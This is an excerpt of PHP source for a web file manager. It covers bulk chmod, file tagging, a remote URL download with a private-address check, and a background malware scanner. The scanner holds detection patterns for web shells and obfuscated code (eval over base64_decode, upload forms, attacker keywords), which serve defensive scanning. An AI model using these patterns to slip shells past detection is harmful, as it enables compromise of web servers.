    public function getColor($t){$c=['image'=>'#f59e0b','video'=>'#ec4899','audio'=>'#8b5cf6','archive'=>'#f97316','pdf'=>'#ef4444','word'=>'#3b82f6','excel'=>'#22c55e','code'=>'#818cf8','data'=>'#06b6d4','text'=>'#94a3b8','config'=>'#fb7185','markdown'=>'#38bdf8','file'=>'#52525b'];return isset($c[$t])?$c[$t]:'#52525b';}
    public function canPreview($t){return in_array($t,['image','video','audio','pdf','text','code','data','config','markdown','word','excel']);}
    public function isTar($f){return in_array(strtolower(pathinfo($f,PATHINFO_EXTENSION)),['tar','gz','bz2','tgz','xz']);}
    public function breadcrumbs(){$d=$this->currentDir;$parts=explode(DIRECTORY_SEPARATOR,$d);$path='';$r=[];foreach($parts as $p){if($p==='')continue;$path.=DIRECTORY_SEPARATOR.$p;$r[]=['path'=>$path,'label'=>$p];}return $r;}

    /* ══ Bulk chmod ══ */
    private function bulkChmod(){
        $items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $perm=isset($_POST['perm'])?trim($_POST['perm']):'';
        if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
        $ok=0;foreach($items as $n){if(@chmod($this->currentDir.'/'.$n,octdec($perm)))$ok++;}
        $this->log('bulk_chmod',"$ok item(s) -> $perm");
        $this->addMsg("Permissions updated on $ok item(s) ($perm).",'success');
    }

    /* ══ Tags / Labels ══ */
    private function tagsPath(){return $this->root.'/.fm_tags.json';}
    private function loadTags(){$f=$this->tagsPath();if(!file_exists($f))return[];$d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];}
    private function saveTags($t){@file_put_contents($this->tagsPath(),json_encode($t,JSON_PRETTY_PRINT));}
    public function getTagsFor($dir){$all=$this->loadTags();$r=[];foreach($all as $p=>$v){if(dirname($p)===$dir)$r[basename($p)]=$v;}return $r;}
    private function setTag(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        $p=$this->currentDir.'/'.$n;if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
        $color=isset($_POST['color'])?trim($_POST['color']):'';$label=isset($_POST['label'])?trim(substr($_POST['label'],0,24)):'';
        if(!preg_match('/^#[0-9a-fA-F]{6}$/',$color)){$this->addMsg('Invalid color.','danger');return;}
        $tags=$this->loadTags();$tags[$p]=['color'=>$color,'label'=>$label];$this->saveTags($tags);
        $this->log('tag',"$n -> $label");$this->addMsg("Tag applied to \"$n\".",'success');
    }
    private function removeTag(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $p=$this->currentDir.'/'.$n;$tags=$this->loadTags();
        if(isset($tags[$p])){unset($tags[$p]);$this->saveTags($tags);$this->addMsg('Tag removed.','warning');}
    }

    /* ══ Remote URL download ══ */
    private function remoteDownload(){
        $url=isset($_POST['url'])?trim($_POST['url']):'';
        $fname=isset($_POST['fname'])?trim(basename($_POST['fname'])):'';
        if(!preg_match('#^https?://#i',$url)){$this->addMsg('Enter a valid http(s) URL.','danger');return;}
        $host=parse_url($url,PHP_URL_HOST);
        if(!$host){$this->addMsg('Invalid URL.','danger');return;}
        $ip=@gethostbyname($host);
        if($ip&&(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE))){
            $this->addMsg('Refusing to fetch a private/internal address.','danger');return;
        }
        if(!$fname){$path=parse_url($url,PHP_URL_PATH);$fname=$path?basename($path):'';}
        if(!$fname||strpos($fname,'.')===false)$fname='download_'.time();
        $fname=preg_replace('/[^A-Za-z0-9._-]/','_',$fname);
        $dest=$this->currentDir.'/'.$fname;
        if($this->isProtectedItem($fname,$dest)){$this->addMsg('Access denied.','danger');return;}
        $maxBytes=200*1024*1024;
        if(!function_exists('curl_init')){$this->addMsg('cURL extension not available.','danger');return;}
        $fp=@fopen($dest,'w');if(!$fp){$this->addMsg('Cannot write destination file.','danger');return;}
        $ch=curl_init($url);
        curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>60,CURLOPT_CONNECTTIMEOUT=>15,CURLOPT_USERAGENT=>'FileManager/1.0',CURLOPT_PROTOCOLS=>CURLPROTO_HTTP|CURLPROTO_HTTPS,CURLOPT_NOPROGRESS=>false,
            CURLOPT_PROGRESSFUNCTION=>function($r,$dl_size,$dl,$ul_size,$ul)use($maxBytes){return ($dl>$maxBytes)?1:0;},
            CURLOPT_BUFFERSIZE=>65536]);
        $ok=curl_exec($ch);$err=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);fclose($fp);
        if(!$ok||$code>=400){@unlink($dest);$this->addMsg('Download failed: '.($err?:"HTTP $code"),'danger');return;}
        $this->log('remote_download',"$fname <- $url");
        $this->addMsg("Downloaded \"$fname\" (".fmtSz(filesize($dest)).').','success');
    }

    /* ══ Threats Alerts ══
       This is deliberately a cooperative background scanner. PHP requests
       are short-lived, so the cursor, known file metadata, findings,
       signatures, and CMS choices live in a private JSON directory. The
       browser polls the endpoint while the manager is open; ordinary page
       renders never start a scan. */
    private function threatsDir(){
        $d=__DIR__.'/.threats-alerts';
        if(!is_dir($d)){@mkdir($d,0700,true);}
        @chmod($d,0700);
        return $d;
    }
    private function threatsStatePath(){
        $base=$this->root?:realpath(__DIR__)?:__DIR__;
        return $this->threatsDir().'/state-'.substr(hash('sha256',$base),0,24).'.json';
    }
    private function threatsStateMaxBytes(){return 12*1024*1024;}
    private function threatsCompactState(&$state){
        foreach($state['findings']??[] as &$finding)unset($finding['content_b64']);
        unset($finding);
        foreach($state['signatures']??[] as &$signature)unset($signature['content_b64']);
        unset($signature);
        if(isset($state['priority_dirs'])&&is_array($state['priority_dirs']))
            $state['priority_dirs']=array_values(array_unique(array_slice($state['priority_dirs'],0,64)));
    }
    private function threatsEmptyState(){
        $base=$this->root?:realpath(__DIR__)?:__DIR__;
        return[
            'version'=>2,'scan_mode'=>2,'root'=>$base,'started'=>time(),'last_run'=>0,'scan_cycle'=>0,
            'complete'=>false,'dirs'=>[['path'=>$base,'entries'=>null,'index'=>0]],
            'watch_dirs'=>[],'watch_cursor'=>0,'watch_dir_cursors'=>[],'dir_mtimes'=>[],
            'priority_dirs'=>[],'priority_cursor'=>0,'priority_dir_cursors'=>[],
            'priority_last_run'=>0,'priority_last_path'=>'','priority_auto_deleted'=>0,
            'known'=>[],'findings'=>[],'signatures'=>[],
            'whitelist_files'=>[],'whitelist_hashes'=>[],
            'user_signatures'=>[],'user_whitelist_names'=>[],'user_whitelist_fingerprints'=>[],
            'scanned'=>0,'auto_deleted'=>0,'last_path'=>'','last_reason'=>''
        ];
    }
    private function threatsLoadState(){
        $f=$this->threatsStatePath();
        $size=is_file($f)?@filesize($f):0;
        if($size!==false&&$size>$this->threatsStateMaxBytes()){
            /* A previous version could persist a full Base64 copy for every
               finding. Quarantine that metadata before PHP tries to decode it
               and starts consuming hundreds of MB. User files are untouched. */
            $quarantine=$f.'.oversize.'.time();
            if(!@rename($f,$quarantine))@unlink($f);
            return $this->threatsEmptyState();
        }
        $d=is_file($f)?@json_decode((string)@file_get_contents($f),true):null;
        $base=$this->root?:realpath(__DIR__)?:__DIR__;
        if(!is_array($d)||($d['root']??'')!==$base)return $this->threatsEmptyState();
        foreach(['dirs','watch_dirs','watch_dir_cursors','dir_mtimes','priority_dirs','priority_dir_cursors','known','findings','signatures','whitelist_files','whitelist_hashes','user_signatures','user_whitelist_names','user_whitelist_fingerprints'] as $k){
            if(!isset($d[$k])||!is_array($d[$k]))$d[$k]=[];
        }
        $priorityDirs=[];
        foreach($d['priority_dirs'] as $priorityDir){
            $priorityDir=realpath((string)$priorityDir);
            if($priorityDir&&is_dir($priorityDir)&&!$this->threatsSkip($priorityDir)&&$this->threatsPathAllowed($priorityDir))
                $priorityDirs[$priorityDir]=true;
        }
        $d['priority_dirs']=array_slice(array_keys($priorityDirs),0,64);
        foreach(array_keys($d['priority_dir_cursors']) as $priorityDir)
            if(!in_array($priorityDir,$d['priority_dirs'],true))unset($d['priority_dir_cursors'][$priorityDir]);
        $d['priority_cursor']=max(0,(int)($d['priority_cursor']??0));
        $d['priority_last_run']=(int)($d['priority_last_run']??0);
        $d['priority_last_path']=(string)($d['priority_last_path']??'');
        $d['priority_auto_deleted']=(int)($d['priority_auto_deleted']??0);
         $d['scan_cycle']=max(0,(int)($d['scan_cycle']??0));
        /* Older states may contain full scandir() results in pending frames.
           Keep their findings/signatures, but restart traversal in batches. */
        if((int)($d['scan_mode']??0)!==2){
            $d['scan_mode']=2;$d['complete']=false;
            $d['dirs']=[['path'=>$base,'entries'=>null,'index'=>0,'batch'=>true]];
            $d['watch_dirs']=[];$d['watch_cursor']=0;$d['watch_dir_cursors']=[];$d['dir_mtimes']=[];
        }
        $d['findings']=array_values(array_filter($d['findings'],fn($f)=>!$this->threatsSkip($f['path']??'')&&$this->threatsScannableFile($f['path']??'')));
        $d['dirs']=array_values(array_filter($d['dirs'],fn($f)=>!$this->threatsSkip($f['path']??'')));
        $d['watch_dirs']=array_values(array_filter($d['watch_dirs'],fn($p)=>!$this->threatsSkip($p)));
        foreach(array_keys($d['known']) as $p)if($this->threatsSkip($p))unset($d['known'][$p]);
        foreach(array_keys($d['whitelist_files']) as $i)if($this->threatsSkip($d['whitelist_files'][$i]))unset($d['whitelist_files'][$i]);
        $d['whitelist_files']=array_values($d['whitelist_files']);
        foreach($d['findings'] as &$finding)$this->threatsApplyPriority($finding);
        unset($finding);$this->threatsSortFindings($d);
        $this->threatsCompactState($d);
        return $d;
    }
    private function threatsSaveState(&$state){
        $this->threatsCompactState($state);
        $f=$this->threatsStatePath();$tmp=$f.'.tmp.'.getmypid();
        $json=@json_encode($state,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
        if($json===false||@file_put_contents($tmp,$json,LOCK_EX)===false)return false;
        @chmod($tmp,0600);
        if(!@rename($tmp,$f)){@unlink($tmp);return false;}
        @chmod($f,0600);return true;
    }
    private function threatsRoot(){
        $base=$this->root?:realpath(__DIR__)?:__DIR__;
        return is_dir($base)?$base:false;
    }
    private function threatsMaxBytes(){return 3*1024*1024;}
    private function threatsPathAllowed($path){
        $rp=realpath((string)$path);$root=$this->threatsRoot();
        return $rp&&$root&&($rp===$root||strpos($rp.DIRECTORY_SEPARATOR,rtrim($root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)===0);
    }
    private function threatsSkip($path){
        $rp=realpath((string)$path);if(!$rp)return true;
        if($rp===__FILE__)return true;
        $base=basename($rp);
        if(in_array($base,['.threats-alerts','.trash','.fm_trash','.mail_sandbox','.agents','.local','.git','.cache','.fg_'.substr(md5(php_uname('n').__DIR__),0,14)],true))return true;
        if(in_array($base,['.guardian-restore.php','.guardian-server-router.php','.guardian_boot','.guardian_watchdog_attempt','.guardian_update_state.json','.guardian_update_state.php','.login_attempts.json','.favorites.json','.users.json','.users.php','.mfm_sessions.php','.shares.php','.cms_pw_vault.php','.cms_vault_key.php','.activity.json','.shares.json','.theme.json','.trash.json','.cms_pw_vault.json','.cms_vault_key','.assistant-agent.json.enc','.fm_notes.txt','.fm_guardian_launch.php','tmt.ttf'],true))return true;
        if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$|^\.fm(?:[-_]|$)|^\.guardian(?:[-_]|$)|^\.assistant-agent(?:[-_.]|$)/i',$base))return true;
        foreach(['.threats-alerts','.trash','.fm_trash','.mail_sandbox','.agents','.local','.git','.cache'] as $dir){
            $ignored=realpath(__DIR__.DIRECTORY_SEPARATOR.$dir);
            if($ignored&&($rp===$ignored||strpos($rp.DIRECTORY_SEPARATOR,rtrim($ignored,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)===0))return true;
        }
        return false;
    }
    private function threatsNonTextExtension($path){
        return in_array(strtolower(pathinfo((string)$path,PATHINFO_EXTENSION)),[
            'jpg','jpeg','jfif','png','apng','gif','webp','ico','bmp','tif','tiff','avif','heic','heif','raw','cr2','nef','orf','dng','psd','xcf','svg',
            'mp3','wav','flac','ogg','aac','m4a','mp4','avi','mkv','mov','webm',
            'zip','rar','7z','tar','gz','bz2','tgz','xz','zst','lz','lz4','lzh','cab','arj','ace','iso','img','dmg','wim','jar','war','ear','apk','ipa','deb','rpm','tbz','tbz2','txz',
            'pdf','doc','docx','odt','xls','xlsx','ods','csv','ppt','pptx','odp','rtf'
        ],true);
    }
    private function threatsExecutableExtensions(){
        return[
            'php','phtml','php3','php4','php5','php7','php8','phar','inc',
            'cgi','pl','pm','py','py3','rb','sh','bash','zsh','fish',
            'asp','aspx','jsp','jspx','js','mjs','cjs','ts','wasm',
            'exe','com','scr','msi','dll','so','dylib','bin','elf'
        ];
    }
    private function threatsScannableFile($path){
        $path=(string)$path;$ext=strtolower(pathinfo($path,PATHINFO_EXTENSION));
        if(in_array($ext,$this->threatsExecutableExtensions(),true))return true;
        if($this->threatsNonTextExtension($path))return false;
        $rp=realpath($path);if(!$rp||!is_file($rp))return false;
        $mode=@fileperms($rp);
        if($mode!==false&&($mode&0111)!==0)return true;
        $head=@file_get_contents($rp,false,null,0,256);
        return is_string($head)&&preg_match('/^#![ \t]*\/(?:usr\/bin\/env[ \t]+)?(?:php|python[0-9.]*|perl|ruby|node|bash|sh|zsh|fish|pwsh|powershell)\b/im',$head)===1;
    }
    private function threatsExtensionRisk($path){
        $name=strtolower(basename((string)$path));$ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
        if(in_array($ext,['php','phtml','php3','php4','php5','php7','php8','phar','inc'],true))return 90;
        if(in_array($ext,['cgi','pl','pm','py','py3','rb','sh','bash','zsh','fish','asp','aspx','jsp','jspx'],true))return 80;
        if(in_array($ext,['js','mjs','cjs','ts'],true))return 55;
        if(in_array($ext,['html','htm','xhtml','shtml'],true))return 25;
        if($ext==='css')return 10;
        if(in_array($ext,['env','ini','conf','config','yaml','yml','json','xml'],true)||in_array($name,['.env','.htaccess','web.config'],true))return 35;
        return 15;
    }
    private function threatsApplyPriority(&$finding){
        $reasons=$finding['reasons']??[];
        if(!is_array($reasons))$reasons=($finding['reason']??'')!==''?[$finding['reason']]:[];
        $score=$this->threatsExtensionRisk($finding['path']??$finding['name']??'');
        foreach($reasons as $reason){
            if(stripos($reason,'web shell')!==false)$score+=100;
            elseif(stripos($reason,'file upload')!==false)$score+=95;
            elseif(stripos($reason,'obfuscat')!==false)$score+=95;
            elseif(stripos($reason,'encrypted')!==false)$score+=90;
            elseif(stripos($reason,'binary')!==false)$score+=70;
            elseif(stripos($reason,'suspicious keyword')!==false)$score+=35;
            else $score+=20;
        }
        $score+=max(0,count($reasons)-1)*12;
        $finding['priority']=min(999,(int)$score);
        $finding['severity']=$finding['priority']>=190?'Critical':($finding['priority']>=140?'High':($finding['priority']>=90?'Medium':'Low'));
        $finding['extension']=strtolower(pathinfo((string)($finding['name']??$finding['path']??''),PATHINFO_EXTENSION));
    }
    private function threatsSortFindings(&$state){
        usort($state['findings'],function($a,$b){
            $score=((int)($b['priority']??0))-((int)($a['priority']??0));
            return $score!==0?$score:strcasecmp((string)($a['path']??''),(string)($b['path']??''));
        });
    }
    private function threatsSmallText($path,$content){
        if($this->threatsNonTextExtension($path))return false;
        $ext=strtolower(pathinfo($path,PATHINFO_EXTENSION));
        if(in_array($ext,['pdf','doc','docx','xls','xlsx','ppt','pptx'],true))return false;
        if(strpos($content,"\0")!==false)return false;
        $print=0;$len=strlen($content);
        if($len===0)return true;
        for($i=0;$i<$len;$i++){ $o=ord($content[$i]); if($o===9||$o===10||$o===13||($o>=32&&$o<=126)||$o>=160)$print++; }
        return ($print/$len)>=.68;
    }
    private function threatsEntropy($content){
        $len=strlen($content);if($len<96)return 0;
        $freq=array_fill(0,256,0);
        for($i=0;$i<$len;$i++)$freq[ord($content[$i])]++;
        $e=0.0;foreach($freq as $n){if(!$n)continue;$p=$n/$len;$e-=$p*log($p,2);}
        return $e;
    }
    private function threatsAnalyze($path){
        if($this->threatsNonTextExtension($path))return null;
        $max=$this->threatsMaxBytes();$size=(int)@filesize($path);
        if($size<1||$size>$max||!is_readable($path))return null;
        $content=@file_get_contents($path,false,null,0,$max+1);
        if($content===false||strlen($content)>$max)return null;
        $reasons=[];
        if($this->isEncryptedPhp($path))$reasons[]='Encrypted content';
        $text=$this->threatsSmallText($path,$content);
        if($text){
            if(preg_match('/<input\b[^>]*\btype\s*=\s*[\'"]?file\b|<form\b[^>]*\benctype\s*=\s*[\'"]multipart\/form-data|move_uploaded_file\s*\(|\$_FILES\s*\[/i',$content))$reasons[]='File Upload Shell';
            if($this->isWebShellOrFileMgr($path))$reasons[]='Web shell / file manager indicators';
            foreach(['Upload','upload','hack','hacked','hacker','Nx-ZD','Nx-Dz','Nxploited'] as $word){
                if(stripos($content,$word)!==false){$reasons[]='Suspicious keyword: '.$word;break;}
            }
            if(preg_match('/(?<![A-Za-z])Nx(?![A-Za-z])/',$content))$reasons[]='Suspicious keyword: Nx';
            if(preg_match('/\b(eval|assert|include|require)\s*\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13|hex2bin)\s*\(/i',$content))$reasons[]='Obfuscated executable content';
        }elseif($this->threatsEntropy($content)>=7.25)$reasons[]='Encrypted/binary content';
        if(!$reasons)return null;
        $hash=hash('sha256',$content);
        $item=['path'=>realpath($path),'name'=>basename($path),'size'=>$size,'mtime'=>(int)@filemtime($path),'hash'=>$hash,'reasons'=>array_values(array_unique($reasons)),'reason'=>implode(' · ',array_values(array_unique($reasons)))];
        $this->threatsApplyPriority($item);
        return $item;
    }
    private function threatsPublicUrl($path){
        $root=$this->threatsRoot();$doc=realpath((string)($_SERVER['DOCUMENT_ROOT']??''));
        $rel='';
        if($doc&&$root&&($root===$doc||strpos($root.DIRECTORY_SEPARATOR,rtrim($doc,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)===0)){
            $rootRel=trim(str_replace(DIRECTORY_SEPARATOR,'/',substr($root,strlen($doc))),'/');
            $fileRel=trim(str_replace(DIRECTORY_SEPARATOR,'/',substr($path,strlen($root))),'/');
            $rel=($rootRel!==''?$rootRel.'/':'').$fileRel;
